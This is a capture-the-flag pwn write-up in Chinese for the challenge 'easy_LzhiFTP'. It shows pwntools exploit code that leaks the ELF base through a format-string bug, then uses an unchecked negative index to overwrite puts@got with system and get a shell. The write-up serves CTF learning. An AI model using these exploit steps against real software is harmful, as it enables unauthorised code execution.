# easy_LzhiFTP

> 分类：Pwn

## 题目描述

got 表可写，输入初始化时设置固定随机数种子。edit 流程 index 检查不严（未检查小于 0），结合 touch 写入 bss 可任意地址写。

## 考察知识点

- 格式化字符串漏洞（泄露 elfbase）
- 任意地址写（index 越界）
- GOT 表覆写

## 解法

1. 密码通过 gdb 断点到 `strcmp(s1, s2)` 查看 s2 得到。
2. 利用 yes/no 部分的格式化字符串漏洞泄露 elfbase：

```python
sla("do you like my Server??(yes/No)", b'No%6$p')
elfbase = int(ru('n'), 16) - 0x2096
```

3. edit 流程 idx 检查不严，`touch` 时文件名写到 bss，结合 idx 负值做任意地址写，把 puts 的 got 表写为 system 的 plt 地址：

```python
puts_got = elfbase + elf.got["puts"]
system = elfbase + elf.plt["system"]

payload = b'touch ' + p64(puts_got)
sla("IMLZH1-FTP> ", payload)
sla("write Context:", 'a')

sla("IMLZH1-FTP> ", 'edit')
sea(b'idx:n', '-16')
se(p64(system))

sla("IMLZH1-FTP> ", 'touch /bin/sh')
sl("ls")
```

4. 之后 `ls` 触发 system 执行命令。

## 参考答案

（flag 通过覆写 puts@got 为 system 后执行命令读取）

## 来源

- 作者：hash_hash | https://cn-sec.com/archives/1802791.html
